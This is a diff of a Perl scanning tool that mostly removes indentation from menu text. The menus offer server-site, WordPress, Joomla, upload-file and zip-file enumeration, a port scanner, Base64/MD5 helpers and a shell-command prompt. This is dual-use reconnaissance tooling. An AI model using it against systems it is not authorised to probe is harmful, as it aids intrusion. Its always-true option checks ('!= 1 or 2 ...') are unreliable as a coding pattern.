+  print "[+] 2 = GET SERVER SITES\n";
+  print "[+] 3 = GET SERVER WORDPRESS SITES\n";
+  print "[+] 4 = GET SERVER JOOMLA SITES\n";
+  print "[+] 5 = GET UPLOAD FILES\n";
+  print "[+] 6 = GET ZIP FILES\n";
+  print "[+] 7 = BACK (<-)\n";
+  print "[+] 8 = EXIT (->)\n";
+  print "=========================================\n";
 
   print color 'yellow';
-  print "    [+] Please select an option -> ";
+  print "[+] Please select an option -> ";
   print color RESET;
   $IDS =<STDIN>;
   chomp($IDS);
@@ -4392,21 +4996,21 @@ if($task eq "3"){
     print color 'bold magenta';
     print "[..][+] PORT SCANNER OPTIONS\n";
     print color 'magenta', RESET;
-    print "    =========================================\n";
-    print "    [+] 1 = BASIC MODE TCP (Quick)\n";
-    print "    [+] 2 = BASIC MODE UDP (Quick)\n";
-    print "    [+] 3 = BASIC MODE TCP + UDP (Quick)\n";
-    print "    [+] 4 = COMPLETE MODE TCP\n";
-    print "    [+] 5 = COMPLETE MODE UDP\n";
-    print "    [+] 6 = COMPLETE MODE TCP + UDP\n";
-    print "    [+] 7 = DIFINDED TCP\n";
-    print "    [+] 8 = DIFINDED UDP\n";
-    print "    [+] 9 = DIFINDED TCP + UDP\n";
-    print "    [+] 10 = BACK (<-)\n";
-    print "    [+] 11 = EXIT (->)\n";
-    print "    =========================================\n";
+    print "=========================================\n";
+    print "[+] 1 = BASIC MODE TCP (Quick)\n";
+    print "[+] 2 = BASIC MODE UDP (Quick)\n";
+    print "[+] 3 = BASIC MODE TCP + UDP (Quick)\n";
+    print "[+] 4 = COMPLETE MODE TCP\n";
+    print "[+] 5 = COMPLETE MODE UDP\n";
+    print "[+] 6 = COMPLETE MODE TCP + UDP\n";
+    print "[+] 7 = DIFINDED TCP\n";
+    print "[+] 8 = DIFINDED UDP\n";
+    print "[+] 9 = DIFINDED TCP + UDP\n";
+    print "[+] 10 = BACK (<-)\n";
+    print "[+] 11 = EXIT (->)\n";
+    print "=========================================\n";
     print color 'yellow';
-    print "    [+] Select an option -> ";
+    print "[+] Select an option -> ";
     print color RESET;
     $menu=<STDIN>;
     chomp($menu);
@@ -4425,14 +5029,14 @@ if($task eq "3"){
     if ($menu==10) {goto IDS;}
     if ($menu==11) {
       print color 'red';
-      print "    [!] Have A Good Time! Bye.\n";
+      print "[!] Have A Good Time! Bye.\n";
 	  print color RESET;
 	  sleep(1);
 	  exit;
     }
     if ($menu != 1 or 2 or 3 or 4 or 5 or 6 or 7 or 8 or 9 or 10 or 11) {
       print color 'red';
-      print "    [!] Upsss.. Invalid Option!\n";
+      print "[!] Upsss.. Invalid Option!\n";
 	  print color RESET;
 	  sleep(1);
 	  goto menu;
@@ -4445,14 +5049,14 @@ if($task eq "3"){
   
     nresult3:;
     print color 'yellow';
-    print "    [+] Number of results (must be <= existants search results!): ";
+    print "[+] Scan level!: ";
     print color RESET;
-    $mpages = <STDIN>;
-    chomp($mpages);
+    $mlevel = <STDIN>;
+    chomp($mlevel);
 	
-	if (!$mpages){ 
+	if (!$mlevel){ 
       print color 'red';
-	  print "    [+] Uppss.. you have to set a value!\n";
+	  print "[+] Uppss.. you have to set a value!\n";
       print color RESET;
 	  goto nresult3;
 	}
@@ -4461,7 +5065,7 @@ if($task eq "3"){
     msites ();
     after1:;
     print color 'yellow';
-    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+    print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
 	print color RESET;
     $after1=<STDIN>;
     chomp ($after1);
@@ -4471,13 +5075,13 @@ if($task eq "3"){
     }
     if ($after1==0) {
         print color 'red';
-        print "    [!] Have A Good Time! Bye.\n";
+        print "[!] Have A Good Time! Bye.\n";
 	    print color RESET;
       exit;
     }
     if ($after1 != 1 or 0) {
 	    print color 'red';
-        print "    [!] Upsss.. Invalid Option!\n";
+        print "[!] Upsss.. Invalid Option!\n";
 	    print color RESET;
       sleep(1);
       goto after1;
@@ -4493,7 +5097,7 @@ if($task eq "3"){
     if (!-e $listcheck2){
 	  sleep(1);
 	  print color 'red';
-	  print "    [+] Please make a scan to get the server sites First!!\n";
+	  print "[+] Please make a scan to get the server sites First!!\n";
 	  print color RESET;
 	  goto IDS;
     }
@@ -4502,7 +5106,7 @@ if($task eq "3"){
 
     after1:;
     print color 'yellow';
-    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+    print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
 	print color RESET;
     $after1=<STDIN>;
     chomp ($after1);
@@ -4511,13 +5115,13 @@ if($task eq "3"){
     }
     if ($after1==0) {
       print color 'red';
-      print "    [!] Have A Good Time! Bye.\n";
+      print "[!] Have A Good Time! Bye.\n";
 	  print color RESET;
       exit;
     }
     if ($after1 != 1 or 0) {
 	  print color 'red';
-      print "    [!] Upsss.. Invalid Option!\n";
+      print "[!] Upsss.. Invalid Option!\n";
 	  print color RESET;
       sleep(1);
       goto after1;
@@ -4532,7 +5136,7 @@ if($task eq "3"){
     if (!-e $listcheck2){
 	  sleep(1);
 	  print color 'red';
-	  print "    [+] Please make a scan to get the server sites First!!\n";
+	  print "[+] Please make a scan to get the server sites First!!\n";
 	  print color RESET;
 	  goto IDS;
     }
@@ -4540,7 +5144,7 @@ if($task eq "3"){
     mjoomsites();
     after1:;
     print color 'yellow';
-    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+    print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
 	print color RESET;
     $after1=<STDIN>;
     chomp ($after1);
@@ -4550,13 +5154,13 @@ if($task eq "3"){
     }
     if ($after1==0) {
         print color 'red';
-        print "    [!] Have A Good Time! Bye.\n";
+        print "[!] Have A Good Time! Bye.\n";
 	    print color RESET;
       exit;
     }
     if ($after1 != 1 or 0) {
 	    print color 'red';
-        print "    [!] Upsss.. Invalid Option!\n";
+        print "[!] Upsss.. Invalid Option!\n";
 	    print color RESET;
       sleep(1);
       goto after1;
@@ -4570,7 +5174,7 @@ if($task eq "3"){
     if (!-e $listcheck2){
 	  sleep(1);
 	  print color 'red';
-	  print "    [+] Please make a scan to get the server sites First!!\n";
+	  print "[+] Please make a scan to get the server sites First!!\n";
 	  print color RESET;
 	  goto IDS;
     }
@@ -4578,7 +5182,7 @@ if($task eq "3"){
     muploadsites();
     after1:;
     print color 'yellow';
-    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+    print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
 	print color RESET;
     $after1=<STDIN>;
     chomp ($after1);
@@ -4587,13 +5191,13 @@ if($task eq "3"){
     }
     if ($after1==0) {
         print color 'red';
-        print "    [!] Have A Good Time! Bye.\n";
+        print "[!] Have A Good Time! Bye.\n";
 	    print color RESET;
       exit;
     }
     if ($after1 != 1 or 0) {
 	    print color 'red';
-        print "    [!] Upsss.. Invalid Option!\n";
+        print "[!] Upsss.. Invalid Option!\n";
 	    print color RESET;
       sleep(1);
       goto after1;
@@ -4608,7 +5212,7 @@ if($task eq "3"){
     if (!-e $listcheck2){
 	  sleep(1);
 	  print color 'red';
-	  print "    [+] Please make a scan to get the server sites First!!\n";
+	  print "[+] Please make a scan to get the server sites First!!\n";
 	  print color RESET;
 	  goto IDS;
     }
@@ -4616,7 +5220,7 @@ if($task eq "3"){
     mzipsites();
     after1:;
     print color 'yellow';
-    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+    print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
 	print color RESET;
     $after1=<STDIN>;
     chomp ($after1);
@@ -4625,13 +5229,13 @@ if($task eq "3"){
     }
     if ($after1==0) {
         print color 'red';
-        print "    [!] Have A Good Time! Bye.\n";
+        print "[!] Have A Good Time! Bye.\n";
 	    print color RESET;
       exit;
     }
     if ($after1 != 1 or 0) {
 	    print color 'red';
-        print "    [!] Upsss.. Invalid Option!\n";
+        print "[!] Upsss.. Invalid Option!\n";
 	    print color RESET;
       sleep(1);
       goto after1;
@@ -4658,7 +5262,7 @@ if($task eq "3"){
 
   if ($IDS != 1 or 2 or 3 or 4 or 5 or 6 or 7 or 8) {
     print color 'red';
-    print "    [!] Upsss.. Invalid Option!\n";
+    print "[!] Upsss.. Invalid Option!\n";
 	print color RESET;
 	sleep(1);
 	goto IDS;
@@ -4674,7 +5278,7 @@ if($task eq "4"){
   
   code:;
   print color 'yellow';
-  print "    [+] Please Enter your string";
+  print "[+] Please Enter your string";
   print "\n    [+] String: ";
   print color RESET;
   $string=<STDIN>;
@@ -4682,7 +5286,7 @@ if($task eq "4"){
 
   if (!$string){ 
       print color 'red';
-	  print "    [+] Uppss.. you have to set a value!\n";
+	  print "[+] Uppss.. you have to set a value!\n";
       print color RESET;
 	  goto code;
   };
@@ -4691,15 +5295,15 @@ if($task eq "4"){
   print color 'bold magenta';
   print "[..][+] BASE 64 ENCODE - DECODE / MD5\n";
   print color 'magenta', RESET;
-  print "    =========================================\n";
-  print "    [+] 1 = MD5 Generator\n";
-  print "    [+] 2 = Encode Base64\n";
-  print "    [+] 3 = Decode Base64\n";
-  print "    [+] 4 = BACK (<-)\n";
-  print "    [+] 5 = EXIT (->)\n";
-  print "    =========================================\n";
+  print "=========================================\n";
+  print "[+] 1 = MD5 Generator\n";
+  print "[+] 2 = Encode Base64\n";
+  print "[+] 3 = Decode Base64\n";
+  print "[+] 4 = BACK (<-)\n";
+  print "[+] 5 = EXIT (->)\n";
+  print "=========================================\n";
   print color 'yellow';
-  print "    [+] Select an option -> ";
+  print "[+] Select an option -> ";
   print color RESET;
   $decodetype =<STDIN>;
   chomp($decodetype);
@@ -4710,7 +5314,7 @@ if($task eq "4"){
 	mmd5();
     after1:;
     print color 'yellow';
-    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+    print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
     print color RESET;
     $after1=<STDIN>;
     chomp ($after1);
@@ -4719,13 +5323,13 @@ if($task eq "4"){
     }
     if ($after1==0) {
       print color 'red';
-      print "    [!] Have A Good Time! Bye.\n";
+      print "[!] Have A Good Time! Bye.\n";
       print color RESET;
       exit;
     }
     if ($after1 != 1 or 0) {
       print color 'red';
-      print "    [!] Upsss.. Invalid Option!\n";
+      print "[!] Upsss.. Invalid Option!\n";
       print color RESET;
       sleep(1);
       goto after1;
@@ -4738,7 +5342,7 @@ if($task eq "4"){
 	mencode64();  
     after2:;
     print color 'yellow';
-    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+    print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
     print color RESET;
     $after2=<STDIN>;
     chomp ($after2);
@@ -4748,13 +5352,13 @@ if($task eq "4"){
     }
     if ($after2==0) {
       print color 'red';
-      print "    [!] Have A Good Time! Bye.\n";
+      print "[!] Have A Good Time! Bye.\n";
       print color RESET;
       exit;
     }
     if ($after2 != 1 or 0) {
       print color 'red';
-      print "    [!] Upsss.. Invalid Option!\n";
+      print "[!] Upsss.. Invalid Option!\n";
       print color RESET;
       sleep(1);
       goto after2;
@@ -4767,7 +5371,7 @@ if($task eq "4"){
 	mdecode64();
     after3:;
     print color 'yellow';
-    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+    print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
     print color RESET;
     $after3=<STDIN>;
     chomp ($after3);
@@ -4776,13 +5380,13 @@ if($task eq "4"){
     }
     if ($after3==0) {
       print color 'red';
-      print "    [!] Have A Good Time! Bye.\n";
+      print "[!] Have A Good Time! Bye.\n";
       print color RESET;
       exit;
     }
     if ($after3 != 1 or 0) {
       print color 'red';
-      print "    [!] Upsss.. Invalid Option!\n";
+      print "[!] Upsss.. Invalid Option!\n";
       print color RESET;
       sleep(1);
       goto after3;
@@ -4805,7 +5409,7 @@ if($task eq "4"){
 
   if ($DECODE != 1 or 2 or 3 or 4 or 5) {
     print color 'red';
-    print "    [!] Upsss.. Invalid Option!\n";
+    print "[!] Upsss.. Invalid Option!\n";
     print color RESET;
     sleep(1);
     goto DECODE;
@@ -4818,14 +5422,14 @@ if($task eq "5"){
 
   TERMINAL:;
   print color 'yellow'; 
-  print "    [+] Enter Command: ";
+  print "[+] Enter Command: ";
   print color RESET;
   $command=<STDIN>;
   chomp ($command);
   $command =~ s/\"//g;
   if (!$command){ 
     print color 'red';
-    print "    [+] Please set a Command!\n";
+    print "[+] Please set a Command!\n";
     print color RESET;
     goto TERMINAL;
   };
@@ -4838,7 +5442,7 @@ if($task eq "5"){
   print color RESET;
   after1:;
   print color 'yellow';
-  print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+  print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
   print color RESET;
   $after1=<STDIN>;
   chomp ($after1);
@@ -4847,13 +5451,13 @@ if($task eq "5"){
   }
   if ($after1==0) {
     print color 'red';
-    print "    [!] Have A Good Time! Bye.\n";
+    print "[!] Have A Good Time! Bye.\n";
     print color RESET;
     exit;
   }
   if ($after1 != 0 or 1) {
 	print color 'red';
-    print "    [!] Upsss.. Invalid Option!\n";
+    print "[!] Upsss.. Invalid Option!\n";
 	print color RESET;
     sleep(1);
     goto after1;
@@ -4888,7 +5492,7 @@ if($task eq "6"){
 
   after1:;
   print color 'yellow';
-  print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+  print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
   print color RESET;
   $after1=<STDIN>;
   chomp ($after1);
@@ -4897,13 +5501,13 @@ if($task eq "6"){
   }
   if ($after1==0) {
     print color 'red';
-    print "    [!] Have A Good Time! Bye.\n";
+    print "[!] Have A Good Time! Bye.\n";
     print color RESET;
     exit;
   }
   if ($after1 != 0 or 1) {
 	print color 'red';
-    print "    [!] Upsss.. Invalid Option!\n";
+    print "[!] Upsss.. Invalid Option!\n";
 	print color RESET;
     sleep(1);
     goto after1;
@@ -4916,7 +5520,7 @@ if($task eq "7"){
   help();
   after100:;
   print color 'yellow';
-  print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+  print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
   print color RESET;
   $after100=<STDIN>;
   chomp ($after100);
@@ -4925,13 +5529,13 @@ if($task eq "7"){
   }
   if ($after100==0) {
     print color 'red';
-    print "    [!] Have A Good Time! Bye.\n";
+    print "[!] Have A Good Time! Bye.\n";
     print color RESET;
     exit;
   }
   if ($after100 != 0 or 1) {
 	print color 'red';
-    print "    [!] Upsss.. Invalid Option!\n";
+    print "[!] Upsss.. Invalid Option!\n";
 	print color RESET;
     sleep(1);
     goto after100;
@@ -4951,7 +5555,7 @@ if($task eq "8"){
 ####END TASKS
 if ($TASKS != 1 or 2 or 3 or 4 or 5 or 6 or 7 or 8) {
   print color 'red';
-  print "    [!] Upsss.. Invalid Option!\n";
+  print "[!] Upsss.. Invalid Option!\n";
   print color RESET;
   sleep(1);
   goto TASKS;
